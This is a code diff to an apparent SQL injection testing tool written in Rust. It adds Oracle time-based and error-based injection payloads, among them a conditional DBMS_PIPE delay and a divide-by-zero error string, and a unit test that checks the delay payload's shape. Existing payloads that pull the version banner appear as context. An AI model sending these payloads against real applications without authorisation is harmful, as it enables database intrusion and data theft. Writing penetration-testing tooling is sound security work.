@@ -10,6 +10,15 @@ pub fn oracle_time_lock(secs: u64) -> String {
     format!("' AND DBMS_LOCK.SLEEP({secs}) --")
 }
 
+/// Conditional variant (`PortSwigger`): only blocks when the condition holds,
+/// reducing false positives vs the unconditional legacy payload.
+#[must_use]
+pub fn oracle_time_conditional(secs: u64) -> String {
+    format!(
+        "' AND 1=(SELECT CASE WHEN (1=1) THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',{secs}) ELSE NULL END FROM dual) --"
+    )
+}
+
 /// Heavy-query variant without `DBMS_PIPE`/`DBMS_LOCK` (P0-5): filtered
 /// stacks that reject `sleep` still run dictionary cartesian joins. An
 /// `all_objects` self-join multiplies rows quadratically, burning seconds
@@ -27,6 +36,9 @@ pub fn oracle_time_heavy() -> String {
 /// - `TO_NUMBER(banner)` — ORA-01722 (`invalid number`) channel
 /// - `XMLTYPE(banner)` — `ORA-06502` / XML parsing error channel
 /// - `DBMS_XDB.GETREPOSITORYRESCONTENT(banner)` — XDB URI error channel
+/// - `CASE WHEN (1=1) THEN TO_CHAR(1/0)` — `PortSwigger` conditional-error
+///   shape (ORA-01476, errors only when the condition holds; appended last
+///   so `--level` budgets stay byte-identical)
 #[must_use]
 pub fn oracle_error_payloads() -> Vec<String> {
     vec![
@@ -36,6 +48,8 @@ pub fn oracle_error_payloads() -> Vec<String> {
         "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) --".to_owned(),
         "' AND XMLTYPE((SELECT banner FROM v$version WHERE ROWNUM=1))='1' --".to_owned(),
         "' AND 1=DBMS_XDB.GETREPOSITORYRESCONTENT((SELECT banner FROM v$version WHERE ROWNUM=1)) --"
+            .to_owned(),
+        "' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) --"
             .to_owned(),
     ]
 }
@@ -52,6 +66,16 @@ mod tests {
     #[test]
     fn lock_shape() {
         assert_eq!(oracle_time_lock(5), "' AND DBMS_LOCK.SLEEP(5) --");
+    }
+
+    #[test]
+    fn conditional_shape() {
+        // `PortSwigger` conditional time delay: blocks only when true.
+        let p = oracle_time_conditional(5);
+        assert!(p.contains("CASE WHEN (1=1)"), "{p}");
+        assert!(p.contains("DBMS_PIPE.RECEIVE_MESSAGE('a',5)"), "{p}");
+        assert!(p.contains("FROM dual"), "{p}");
+        assert!(p.ends_with(" --"), "{p}");
     }
 
     #[test]
